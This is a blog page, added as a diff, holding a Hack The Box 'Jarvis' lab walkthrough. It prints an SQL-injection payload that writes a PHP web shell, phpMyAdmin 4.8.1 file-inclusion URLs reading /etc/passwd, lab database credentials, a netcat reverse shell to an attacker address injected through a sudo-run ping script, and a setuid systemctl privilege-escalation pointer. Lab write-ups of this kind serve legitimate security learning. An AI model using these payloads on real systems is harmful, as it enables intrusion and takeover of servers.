@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Web Content Discovery When we found the another content room.php, we can find the SQL injection in this website.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Jarvis">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack[16].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="Web Content Discovery When we found the another content room.php, we can find the SQL injection in this website.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8M5UnViPuaI0mszMT95AYa5oBT.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnOSwfcv_cJDXxYRBe7fX2nJ8YIg.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fm8zVaAy4E3086lld_14OBfsBGWK.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkE0BUHtiffraIyHt0C8Pu3-r3Ff.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoQpqrYTdza16IpeL9crHyGUuGaI.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuAVveE-UHHQWXBlAv080MbbLAKd.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvkuoVG_l6mAUHa9MeC2B7A2K4iJ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq1IKxPb21s8FVrK5D_vvvs0HeGu.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpmcKjGvW7DFNxJslAnuaLAunU8F.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flpa9OJLJ-1ocdIziNirYVuH4ubU.png">
+<meta property="article:published_time" content="2022-12-16T14:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.622Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penestration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8M5UnViPuaI0mszMT95AYa5oBT.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Jarvis</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%5B21%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%5B17%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[16].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[16].html&text=HTB Jarvis"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[16].html&is_video=false&description=HTB Jarvis"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Jarvis&body=Check out this article: http://kelpie.top/post/Virtual%20Attack[16].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[16].html&name=HTB Jarvis&description=&lt;h2 id=&#34;Web-Content-Discovery&#34;&gt;&lt;a href=&#34;#Web-Content-Discovery&#34; class=&#34;headerlink&#34; title=&#34;Web Content Discovery&#34;&gt;&lt;/a&gt;Web Content Discovery&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8M5UnViPuaI0mszMT95AYa5oBT.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When we found the another content &lt;code&gt;room.php&lt;/code&gt;, we can find the &lt;code&gt;SQL injection&lt;/code&gt; in this website.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[16].html&t=HTB Jarvis"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Content-Discovery"><span class="toc-number">1.</span> <span class="toc-text">Web Content Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sql-Injection"><span class="toc-number">2.</span> <span class="toc-text">Sql Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-4-8-0-Exploit"><span class="toc-number">3.</span> <span class="toc-text">phpmyadmin 4.8.0 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#www-data-shell"><span class="toc-number">4.</span> <span class="toc-text">www-data shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enhanced-your-shell"><span class="toc-number">5.</span> <span class="toc-text">Enhanced your shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-www-data-%E2%80%93-gt-pepper"><span class="toc-number">6.</span> <span class="toc-text">Priv: www-data –&gt; pepper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">7.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">8.</span> <span class="toc-text">Privilege escalation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Jarvis
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-16T14:18:00.000Z" class="dt-published" itemprop="datePublished">2022-12-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penestration-Test/" rel="tag">Penestration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Web-Content-Discovery"><a href="#Web-Content-Discovery" class="headerlink" title="Web Content Discovery"></a>Web Content Discovery</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8M5UnViPuaI0mszMT95AYa5oBT.png"></p>
+<p>When we found the another content <code>room.php</code>, we can find the <code>SQL injection</code> in this website.</p>
+<span id="more"></span>
+
+<h2 id="Sql-Injection"><a href="#Sql-Injection" class="headerlink" title="Sql Injection"></a>Sql Injection</h2><p>We find the parameter <code>cod</code> is vulnerable with <code>SQLMAP</code>.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnOSwfcv_cJDXxYRBe7fX2nJ8YIg.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fm8zVaAy4E3086lld_14OBfsBGWK.png"></p>
+<p><strong>phpmyadmin</strong><br>Username: <code>DBadmin</code><br>Password: <code>imissyou</code></p>
+<ol>
+<li>We can log in with the password to <code>phpmyadmin</code></li>
+<li>The smart way is write a malcious php page in the web contents with <code>SQL Injection</code>.</li>
+</ol>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">cod<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'&lt;?php=system($_GET[1]);?>'</span> <span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>cmd<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="phpmyadmin-4-8-0-Exploit"><a href="#phpmyadmin-4-8-0-Exploit" class="headerlink" title="phpmyadmin 4.8.0 Exploit"></a>phpmyadmin 4.8.0 Exploit</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkE0BUHtiffraIyHt0C8Pu3-r3Ff.png"><br>phpMyAdmin 4.8.1 <code>LFI</code> to <code>RCE</code> Vulnerability<br><a target="_blank" rel="noopener" href="https://www.vulnspy.com/phpmyadmin-4.8.1/">https://www.vulnspy.com/phpmyadmin-4.8.1/</a><br><a target="_blank" rel="noopener" href="https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e">https:&#x2F;&#x2F;medium.com&#x2F;@happyholic1203&#x2F;phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e</a></p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">http://10.10.10.143/phpmyadmin/index.php?target=server_sql.php<span class="token comment">%253f../../../../../../../etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoQpqrYTdza16IpeL9crHyGUuGaI.png"></p>
+<p>Now, I’ ll include my php session info. I’ll check burp to grab my phpMyAdmin cookie, and visit:</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">http://10.10.10.143/phpmyadmin/index.php?cmd=id⌖=db_sql.php<span class="token comment">%3f/../../../../../var/lib/php/sessions/sess_e3qctegac4saf72rocbl1541j26u7mqm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="www-data-shell"><a href="#www-data-shell" class="headerlink" title="www-data shell"></a>www-data shell</h2><p>We can get a <code>www-data</code> shell changing <code>cmd</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuAVveE-UHHQWXBlAv080MbbLAKd.png"></p>
+<h2 id="Enhanced-your-shell"><a href="#Enhanced-your-shell" class="headerlink" title="Enhanced your shell"></a>Enhanced your shell</h2><p>With either shell, I’ll upgrade with the standard technique:</p>
+<ol>
+<li><code>python -c &#39;import pty;pty.spawn(&quot;bash&quot;)&#39;</code></li>
+<li>[ctrl-z] to background shell</li>
+<li><code>stty raw -echo</code></li>
+<li><code>fg</code></li>
+<li><code>reset</code></li>
+<li>Enter <code>screen</code> if asked for a terminal type.</li>
+</ol>
+<h2 id="Priv-www-data-–-gt-pepper"><a href="#Priv-www-data-–-gt-pepper" class="headerlink" title="Priv: www-data –&gt; pepper"></a>Priv: www-data –&gt; pepper</h2><p>run <code>sudo -l</code>to check what commands I can run as another <code>HIGH PRIV</code> users.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvkuoVG_l6mAUHa9MeC2B7A2K4iJ.png"></p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>The we can find the vulnerable function <code>exec_ping</code> in <code>simpler.py</code><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq1IKxPb21s8FVrK5D_vvvs0HeGu.png"></p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">www-data@jarvis:/tmp<span class="token equation string">$ echo -e '#!/bin/bash<span class="token equation-command regex">\n</span><span class="token equation-command regex">\nnc</span> -e /bin/bash 10.10.16.2 9002'
+#!/bin/bash
+
+nc -e /bin/bash 10.10.16.2 9002
+www-data@jarvis:/tmp$</span>
+www-data@jarvis:/tmp<span class="token equation string">$ echo -e '#!/bin/bash<span class="token equation-command regex">\n</span><span class="token equation-command regex">\nnc</span> -e /bin/bash 10.10.14.8 443' > /tmp/d.sh
+www-data@jarvis:/tmp$</span> chmod +x /tmp/d.sh
+www-data@jarvis:/tmp<span class="token equation string">$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
+/ __| | '_ ` _ <span class="token equation-command regex">\|</span> '_ <span class="token equation-command regex">\|</span> |/ _ <span class="token equation-command regex">\ </span>'__| '_ <span class="token equation-command regex">\|</span> | | |
+<span class="token equation-command regex">\_</span>_ <span class="token equation-command regex">\ </span>| | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|<span class="token equation-command regex">\_</span>__|_(_)| .__/ <span class="token equation-command regex">\_</span>_, |
+                |_|               |_|    |___/
+                                @ironhackers.es
+
+***********************************************
+
+Enter an IP: $</span>(/tmp/d.sh)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I got the <code>pepper</code> shell<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpmcKjGvW7DFNxJslAnuaLAunU8F.png"></p>
+<h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> SUID files:
+-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
+-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
+-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctl
+-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
+-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Flpa9OJLJ-1ocdIziNirYVuH4ubU.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Content-Discovery"><span class="toc-number">1.</span> <span class="toc-text">Web Content Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sql-Injection"><span class="toc-number">2.</span> <span class="toc-text">Sql Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-4-8-0-Exploit"><span class="toc-number">3.</span> <span class="toc-text">phpmyadmin 4.8.0 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#www-data-shell"><span class="toc-number">4.</span> <span class="toc-text">www-data shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enhanced-your-shell"><span class="toc-number">5.</span> <span class="toc-text">Enhanced your shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-www-data-%E2%80%93-gt-pepper"><span class="toc-number">6.</span> <span class="toc-text">Priv: www-data –&gt; pepper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">7.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">8.</span> <span class="toc-text">Privilege escalation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[16].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[16].html&text=HTB Jarvis"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[16].html&is_video=false&description=HTB Jarvis"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Jarvis&body=Check out this article: http://kelpie.top/post/Virtual%20Attack[16].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[16].html&title=HTB Jarvis"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[16].html&name=HTB Jarvis&description=&lt;h2 id=&#34;Web-Content-Discovery&#34;&gt;&lt;a href=&#34;#Web-Content-Discovery&#34; class=&#34;headerlink&#34; title=&#34;Web Content Discovery&#34;&gt;&lt;/a&gt;Web Content Discovery&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn8M5UnViPuaI0mszMT95AYa5oBT.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When we found the another content &lt;code&gt;room.php&lt;/code&gt;, we can find the &lt;code&gt;SQL injection&lt;/code&gt; in this website.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[16].html&t=HTB Jarvis"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
